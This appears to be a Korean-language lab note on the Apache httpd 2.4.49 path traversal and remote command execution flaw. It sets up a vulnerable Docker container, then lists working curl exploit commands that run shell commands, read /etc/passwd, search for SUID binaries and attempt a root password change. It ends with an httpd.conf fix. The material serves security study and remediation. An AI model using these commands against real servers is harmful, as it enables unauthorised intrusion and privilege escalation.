###환경 구축 (환경:ubuntu, Docker, vulhub)

##Apache http server docker 이미지 다운로드
 docker pull httpd:2.4.49
 docker pull httpd:2.4.50

##컨테이너 실행
  docker run -d -p 8080:80 httpd:2.4.49

##취약점 CURL 명령어
    
시스템 정보 수집

##사용자 정보 출력 (UID/GID)
curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; id' http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh

##현재 디렉터리 확인
curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; pwd' http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh

##현재 사용자 확인
curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; whoami' http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh

##사용자 계정 확인
curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; cat /etc/passwd' http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh


루트 권한 획득 (권한 상승)

##SUID 바이너리 탐색
curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; find / -perm -4000 2>/dev/null' http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh

##r oot password 변경
curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; /usr/bin/passwd' http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh
bin/su root

##경로 탐색 (/etc/passwd)
curl --path-as-is -v http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

###조치 방법
/usr/local/apache2/conf/httpd.conf

조치전
<Directory "/usr/local/apache2/cgi-bin">
    AllowOverride None
    Options +ExecCGI
    Require all granted
</Directory>

조치후
<Directory />
 Require all denied
</Directory>
